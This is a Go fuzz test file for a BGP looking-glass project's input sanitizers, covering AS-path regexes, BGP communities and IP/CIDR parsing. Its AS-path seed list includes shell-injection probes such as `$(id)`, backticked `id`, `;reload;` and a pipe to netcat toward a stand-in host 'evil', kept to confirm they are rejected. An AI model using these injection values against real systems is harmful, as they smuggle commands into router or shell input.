package utils

import (
	"errors"
	"net"
	"strconv"
	"strings"
	"testing"

	"github.com/AS203038/looking-glass/pkg/errs"
)

// FuzzSanitizeASPathRegex verifies that SanitizeASPathRegex never panics and asserts output correctness.
func FuzzSanitizeASPathRegex(f *testing.F) {
	seeds := []string{
		"203038",
		"_203038",
		"203038_",
		"_203038_",
		"203038$",
		"_203038$",
		"1",
		"",
		"1234567890123456789012345678901",
		`1';reload;'`,
		`1'$(id)'`,
		"1'`id`'",
		`1|nc evil 9`,
	}
	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, aspath string) {
		got, err := SanitizeASPathRegex(aspath)
		if err == nil {
			// Assert correctness of successful sanitization
			if len(got) == 0 {
				t.Errorf("SanitizeASPathRegex(%q) returned empty string with no error", aspath)
			}
			if got[0] != '_' && got[0] != '^' {
				t.Errorf("SanitizeASPathRegex(%q) = %q; expected leading '_' or '^'", aspath, got)
			}
			last := got[len(got)-1]
			if last != '_' && last != '$' {
				t.Errorf("SanitizeASPathRegex(%q) = %q; expected trailing '_' or '$'", aspath, got)
			}
		} else {
			// If validation failed, ensure the input violated the specifications
			if len(aspath) == 0 {
				if !errors.Is(err, errs.ASPathEmpty) {
					t.Errorf("expected ASPathEmpty, got %v", err)
				}
			} else if len(aspath) > 30 {
				if !errors.Is(err, errs.ASPathTooLong) {
					t.Errorf("expected ASPathTooLong, got %v", err)
				}
			} else {
				if !errors.Is(err, errs.ASPathMalformed) {
					t.Errorf("expected ASPathMalformed, got %v", err)
				}
			}
		}
	})
}

// FuzzSanitizeBGPCommunity verifies that SanitizeBGPCommunity never panics and asserts contract correctness.
func FuzzSanitizeBGPCommunity(f *testing.F) {
	f.Add(int32(0), int32(0))
	f.Add(int32(65000), int32(100))
	f.Add(int32(-1), int32(0))
	f.Add(int32(65536), int32(65536))

	f.Fuzz(func(t *testing.T, asn, value int32) {
		got, err := SanitizeBGPCommunity(asn, value)
		outOfRange := asn < 0 || asn > 0xFFFF || value < 0 || value > 0xFFFF

		if outOfRange {
			if !errors.Is(err, errs.CommunityMalformed) {
				t.Errorf("expected CommunityMalformed error for asn=%d value=%d, got %v", asn, value, err)
			}
		} else {
			if err != nil {
				t.Errorf("unexpected error for valid range asn=%d value=%d: %v", asn, value, err)
			}
			// Assert format correctness
			parts := strings.Split(got, ":")
			if len(parts) != 2 {
				t.Fatalf("expected 2 parts split by colon, got %q", got)
			}
			parsedASN, err1 := strconv.ParseInt(parts[0], 10, 32)
			parsedVal, err2 := strconv.ParseInt(parts[1], 10, 32)
			if err1 != nil || err2 != nil {
				t.Fatalf("failed to parse integers from %q", got)
			}
			if int32(parsedASN) != asn || int32(parsedVal) != value {
				t.Errorf("mismatch: got asn=%d val=%d, want asn=%d val=%d", parsedASN, parsedVal, asn, value)
			}
		}
	})
}

// FuzzSanitizeBGPLargeCommunity verifies that SanitizeBGPLargeCommunity never panics and asserts correctness.
func FuzzSanitizeBGPLargeCommunity(f *testing.F) {
	f.Add(uint32(0), uint32(0), uint32(0))
	f.Add(uint32(65000), uint32(100), uint32(200))
	f.Add(uint32(4294967295), uint32(4294967295), uint32(4294967295))

	f.Fuzz(func(t *testing.T, global, local1, local2 uint32) {
		got := SanitizeBGPLargeCommunity(global, local1, local2)

		// Assert correctness: split parts must match inputs exactly
		parts := strings.Split(got, ":")
		if len(parts) != 3 {
			t.Fatalf("expected 3 parts split by colon, got %q", got)
		}
		parsedG, err1 := strconv.ParseUint(parts[0], 10, 32)
		parsedL1, err2 := strconv.ParseUint(parts[1], 10, 32)
		parsedL2, err3 := strconv.ParseUint(parts[2], 10, 32)
		if err1 != nil || err2 != nil || err3 != nil {
			t.Fatalf("failed to parse large community uints from %q", got)
		}
		if uint32(parsedG) != global || uint32(parsedL1) != local1 || uint32(parsedL2) != local2 {
			t.Errorf("mismatch: got %d:%d:%d, want %d:%d:%d", parsedG, parsedL1, parsedL2, global, local1, local2)
		}
	})
}

// FuzzNewIPNET verifies that NewIPNET never panics and asserts strict output correctness.
func FuzzNewIPNET(f *testing.F) {
	f.Add("1.1.1.1")
	f.Add("192.168.0.1/24")
	f.Add("2001:db8::1")
	f.Add("2001:db8::1/64")
	f.Add("invalid")
	f.Add("")

	f.Fuzz(func(t *testing.T, input string) {
		got, err := NewIPNET(input)
		if err == nil {
			// Assert struct correctness on successful parses
			parsedIP := net.ParseIP(got.IP)
			if parsedIP == nil {
				t.Fatalf("NewIPNET(%q) returned unparseable IP: %q", input, got.IP)
			}

			if got.Family != IPv4 && got.Family != IPv6 {
				t.Fatalf("unexpected IP family: %q", got.Family)
			}

			cidrVal, err := strconv.Atoi(got.CIDR)
			if err != nil {
				t.Fatalf("CIDR prefix is not a valid integer: %q", got.CIDR)
			}

			if got.Family == IPv4 {
				if cidrVal < 0 || cidrVal > 32 {
					t.Errorf("IPv4 CIDR %d out of bounds (0..32)", cidrVal)
				}
			} else {
				if cidrVal < 0 || cidrVal > 128 {
					t.Errorf("IPv6 CIDR %d out of bounds (0..128)", cidrVal)
				}
			}

			// Ensure fallback CIDR works when input has no slash
			if !strings.Contains(input, "/") {
				if got.Family == IPv4 && got.CIDR != "32" {
					t.Errorf("expected CIDR 32 for IPv4 input without slash, got %q", got.CIDR)
				}
				if got.Family == IPv6 && got.CIDR != "128" {
					t.Errorf("expected CIDR 128 for IPv6 input without slash, got %q", got.CIDR)
				}
			}
		}
	})
}
